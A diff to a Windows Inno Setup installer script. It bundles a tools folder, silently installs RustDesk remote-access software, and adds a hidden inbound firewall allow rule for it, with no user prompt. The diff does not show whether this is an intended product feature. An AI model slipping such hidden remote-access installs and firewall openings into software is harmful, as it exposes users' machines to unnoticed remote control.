@@ -38,6 +38,7 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 [Files]
 Source: "..\publish-admin\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
 Source: "app_logo.ico"; DestDir: "{app}"; DestName: "app_logo.ico"; Flags: ignoreversion
+Source: "..\src\tools\*"; DestDir: "{app}\tools"; Flags: ignoreversion recursesubdirs createallsubdirs
 
 [Icons]
 Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\app_logo.ico"
@@ -45,6 +46,8 @@ Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
 Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\app_logo.ico"; Tasks: desktopicon
 
 [Run]
+Filename: "{app}\tools\rustdesk.exe"; Parameters: "--install"; Flags: runhidden; Check: FileExists(ExpandConstant('{app}\tools\rustdesk.exe'))
+Filename: "netsh.exe"; Parameters: "advfirewall firewall add rule name=""UltraRemote"" dir=in action=allow program=""{app}\tools\rustdesk.exe"" enable=yes"; Flags: runhidden
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
 
 [Code]
